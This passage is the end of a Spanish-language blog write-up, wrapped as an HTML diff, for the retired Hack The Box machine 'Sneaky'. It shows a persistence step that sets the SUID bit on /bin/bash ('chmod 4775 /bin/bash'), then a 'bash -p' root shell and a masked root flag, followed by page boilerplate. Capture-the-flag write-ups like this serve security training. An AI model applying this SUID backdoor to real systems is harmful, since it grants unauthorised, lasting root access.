+<p>Ahora procederiamos a hacer un poco de Persistencia y conseguir la flag de <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># chmod 4775 /bin/bash</span>
+<span class="c"># exit</span>
+
+thrasivoulos@Sneaky:/tmp<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-4.3# <span class="nb">whoami
+</span>root
+<span class="c"># cat root/root.txt</span>
+c5153d86cb175a9d5d9axxxxxxxxxxxxxx
+</code></pre></div></div>
+<p>Maquina Rooteada =) ! Primer Buffer Overflow con Linux x86 !</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/05/26/Sneaky-HTB-BufferOverFlow.html';
+     this.page.identifier = '/2021/05/26/Sneaky-HTB-BufferOverFlow';
+     this.page.title = 'Maquina  Retirada Sneaky de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
